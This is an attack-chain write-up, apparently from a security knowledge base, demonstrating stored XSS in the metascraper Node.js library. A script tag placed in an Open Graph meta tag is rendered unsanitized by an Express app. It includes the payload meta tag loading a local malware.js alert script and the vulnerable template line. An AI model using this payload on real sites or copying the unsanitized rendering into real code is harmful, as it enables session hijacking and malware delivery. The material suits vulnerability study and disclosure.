---
id: ac-metascraper-xss-og
tags:
  - xss
  - stored-xss
  - node.js
  - open-graph
  - metascraper
  - javascript-injection
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/metascraper]]'
  - '[[tools/got]]'
  - '[[tools/express]]'
  - '[[tools/static-server]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-Open-Graph-HTML]]'
  - '[[procedures/Serve-Malicious-HTML-on-Static-Server]]'
  - '[[procedures/Install-Metascraper-and-Dependencies]]'
  - '[[procedures/Create-Express-App-with-Metascraper]]'
  - '[[procedures/Run-Express-App-to-Host-Scraping-Endpoint]]'
  - '[[procedures/Trigger-XSS-via-Browser-Access]]'
step_count: 6
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:16:20.528Z'
description: >-
  Demonstrates stored XSS exploitation in the metascraper Node.js library by
  injecting malicious JavaScript into Open Graph meta tags, leading to arbitrary
  code execution when scraped metadata is rendered unsanitized in a web
  application.
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Stored XSS in Metascraper via Injected Open Graph Metadata

Multi-stage attack chain demonstrating exploitation of the metascraper library's lack of HTML sanitization, allowing stored XSS through malicious Open Graph metadata injection. An attacker controls a website to embed JavaScript in meta tags, which metascraper extracts unsanitized. A legitimate application using metascraper then renders this metadata in HTML, executing the payload in users' browsers for potential session hijacking or malware distribution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious OG HTML] --> B[Serve Malicious Page]
    B --> C[Install Metascraper]
    C --> D[Build Vulnerable App]
    D --> E[Run App]
    E --> F[Trigger XSS in Browser]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#1abc9c
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/metascraper]]
- [[tools/got]]
- [[tools/express]]
- [[tools/static-server]]

### Target Environment

- Node.js runtime (v12+ recommended)
- Local network access to ports 8080 and 8888
- Browser for final exploitation

### Initial Access Requirements

- Control over a web server to host malicious HTML (local static server suffices for PoC)
- No credentials needed; assumes attacker can publish OG metadata on a site

## Detailed Attack Procedures

### Step 1: Create Malicious Open Graph HTML
procedure: [[procedures/Create-Malicious-Open-Graph-HTML]]

**Objective**: Inject XSS payload into Open Graph meta properties to be scraped by metascraper.

**Instructions**: Create an HTML file with malicious script in og:site_name and a separate JS file for the payload.

**Expected Output**: Files article.html and malware.js ready for serving.

**Success Indicators**:
- HTML file contains <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
- JS file alerts 'Uh oh, I am very bad malware!'

### Step 2: Serve Malicious HTML on Static Server
procedure: [[procedures/Serve-Malicious-HTML-on-Static-Server]]

**Objective**: Host the malicious page locally to simulate an attacker-controlled site.

**Instructions**: Place files in a directory and start a static server on port 8080.

**Expected Output**: Server running at http://127.0.0.1:8080/article.html.

**Success Indicators**:
- Accessing http://127.0.0.1:8080/article.html loads the page without errors
- OG metadata visible in page source

### Step 3: Install Metascraper and Dependencies
procedure: [[procedures/Install-Metascraper-and-Dependencies]]

**Objective**: Set up the vulnerable library in a Node.js project.

**Instructions**: Run the installation command in a new project directory.

**Expected Output**: Packages installed in node_modules.

**Success Indicators**:
- metascraper, got, and express listed in package.json
- No installation errors

### Step 4: Create Express App with Metascraper
procedure: [[procedures/Create-Express-App-with-Metascraper]]

**Objective**: Build a web app that scrapes the malicious URL and inserts metadata unsanitized into HTML.

**Instructions**: Write app.js to fetch, scrape, and serve the metadata at /scrap.

**Expected Output**: app.js file configured to log metadata and respond with HTML including metadata.publisher.

**Success Indicators**:
- Code includes got.get() for fetching and metascraper() for extraction
- Endpoint inserts raw metadata into <div>publisher: ${metadata.publisher}</div>

### Step 5: Run Express App to Host Scraping Endpoint
procedure: [[procedures/Run-Express-App-to-Host-Scraping-Endpoint]]

**Objective**: Start the server to expose the vulnerable scraping functionality.

**Instructions**: Execute the Node.js script.

**Expected Output**: Server listening on port 8888.

**Success Indicators**:
- Console shows 'Example app listening on port 8888!'
- No runtime errors on startup

### Step 6: Trigger XSS via Browser Access
procedure: [[procedures/Trigger-XSS-via-Browser-Access]]

**Objective**: Access the endpoint to execute the injected script.

**Instructions**: Visit the scraping URL in a browser.

**Expected Output**: Alert box pops up with 'Uh oh, I am very bad malware!'.

**Success Indicators**:
- Browser loads malware.js from the static server
- JavaScript executes in the context of the legitimate app

## Attack Chain Summary

### Key Achievements

1. Successful injection of XSS payload via Open Graph meta tags
2. Unsanitized extraction and rendering by metascraper in a Node.js app
3. Arbitrary JavaScript execution in victim browsers, enabling data theft or malware

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]] JavaScript
- [[Drive-by Compromise]] Drive-by Compromise

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
